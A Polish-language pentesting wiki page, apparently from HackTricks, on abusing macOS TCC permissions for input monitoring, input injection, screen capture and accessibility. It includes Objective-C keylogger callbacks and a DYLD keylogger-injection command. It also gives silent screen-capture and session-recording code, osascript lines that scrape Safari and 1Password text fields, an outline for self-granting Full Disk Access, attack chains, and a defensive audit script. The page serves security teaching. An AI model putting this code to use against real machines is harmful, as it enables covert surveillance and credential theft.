# Nadużywanie uprawnień Input Monitoring, Screen Capture i Accessibility w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Trzy powiązane usługi TCC kontrolują sposób, w jaki aplikacje mogą obserwować sesję pulpitu użytkownika i wchodzić z nią w interakcje:

| Usługa TCC | Uprawnienie | Możliwość |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Odczyt wszystkich zdarzeń klawiatury i myszy w całym systemie (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Wstrzykiwanie syntetycznych zdarzeń klawiatury i myszy |
| `kTCCServiceScreenCapture` | **Screen Capture** | Odczyt bufora ekranu, wykonywanie zrzutów ekranu, nagrywanie ekranu |
| `kTCCServiceAccessibility` | **Accessibility** | Kontrolowanie innych aplikacji za pomocą API AXUIElement, odczyt elementów interfejsu użytkownika |

Te uprawnienia stanowią **najbardziej niebezpieczną kombinację w macOS** — razem zapewniają:
- Pełny keylogging każdego naciśnięcia klawisza (hasła, wiadomości, numery kart kredytowych)
- Nagrywanie całej widocznej zawartości ekranu
- Wstrzykiwanie syntetycznych danych wejściowych (klikanie przycisków, zatwierdzanie okien dialogowych)
- Pełną kontrolę nad GUI, równoważną fizycznemu dostępowi

---

## Input Monitoring (kTCCServiceListenEvent)

### Jak to działa

macOS używa **API `CGEventTap`**, aby umożliwić procesom przechwytywanie zdarzeń wejściowych z systemu zdarzeń Quartz. Proces posiadający uprawnienie ListenEvent może utworzyć event tap odbierający **każde zdarzenie klawiatury i myszy** przed dotarciem do aplikacji docelowej lub po nim.<sup>[1]</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Znajdowanie plików binarnych z entitlementami
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Jeśli binary z uprawnieniem ListenEvent ma również **wyłączoną walidację bibliotek** lub **zezwala na zmienne środowiskowe DYLD**, attacker może wstrzyknąć dylib rejestrujący CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Wstrzyknięty dylib dziedziczy uprawnienie TCC ListenEvent celu i przechwytuje wszystkie naciśnięcia klawiszy.

### Attack: Credential Harvesting

Zaawansowany keylogger może korelować naciśnięcia klawiszy z aktywną aplikacją:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Wstrzykiwanie wejścia (kTCCServicePostEvent)

### Jak to działa

Uprawnienie PostEvent umożliwia utworzenie event tap z **`kCGEventTapOptionDefault`** (może modyfikować/wstrzykiwać zdarzenia) zamiast ListenOnly.<sup>[1]</sup> Umożliwia to:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Atak: Automatyczna akceptacja monitów TCC

Za pomocą PostEvent atakujący może **symulować kliknięcie „Allow”** w oknach dialogowych uprawnień TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Przechwytywanie ekranu (kTCCServiceScreenCapture)

### Jak to działa

Uprawnienie do przechwytywania ekranu umożliwia odczytywanie bufora ekranu za pomocą:
- **`CGWindowListCreateImage`** — przechwytywanie dowolnego okna lub całego ekranu
- **`ScreenCaptureKit`** (macOS 12.3+) — nowoczesne API do strumieniowania zawartości ekranu<sup>[3]</sup>
- **`CGDisplayStream`** — sprzętowo akcelerowane przechwytywanie ekranu
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Wyszukiwanie klientów przechwytywania ekranu
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Atak: Przechwytywanie poświadczeń za pomocą OCR

Wstrzyknięty proces przechwytywania ekranu może okresowo rejestrować klatki i używać OCR do wyodrębniania haseł:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Począwszy od **macOS Sonoma**, przechwytywanie ekranu wyświetla **stały wskaźnik** na pasku menu. W starszych wersjach nagrywanie ekranu mogło odbywać się całkowicie niezauważenie. Jednak krótkie przechwycenie pojedynczej klatki może nadal pozostać niezauważone przez użytkowników.

### Attack: Session Recording

Ciągłe nagrywanie ekranu zapewnia kompletny zapis sesji użytkownika:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Dostępność (kTCCServiceAccessibility)

### Jak to działa

Dostęp do funkcji ułatwień dostępu zapewnia kontrolę nad innymi aplikacjami za pośrednictwem **AXUIElement API**.<sup>[2]</sup> Proces z uprawnieniami dostępu do funkcji ułatwień dostępu może:

1. **Odczytywać** dowolny element interfejsu użytkownika w każdej aplikacji (pola tekstowe, etykiety, przyciski, menu)
2. **Klikąć** przyciski i wchodzić w interakcję z kontrolkami
3. **Wpisywać** tekst w dowolnym polu tekstowym
4. **Nawigować** po menu i oknach dialogowych
5. **Scrapować** wyświetlane dane z dowolnej uruchomionej aplikacji
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Atak: Samodzielne Nadawanie Uprawnień TCC

Najbardziej niebezpiecznym nadużyciem accessibility jest **poruszanie się po Ustawieniach systemowych w celu nadania własnemu malware dodatkowych uprawnień**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Atak: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: Zautomatyzowane działania użytkownika
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Łańcuchy ataków

### Łańcuch ataku: Input Monitoring + Screen Capture = Pełny nadzór
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = Pełna zdalna kontrola
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chain: Accessibility → Samodzielne nadanie dostępu do kamery/mikrofonu → Inwigilacja
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Wykrywanie i enumeracja
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Referencje

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
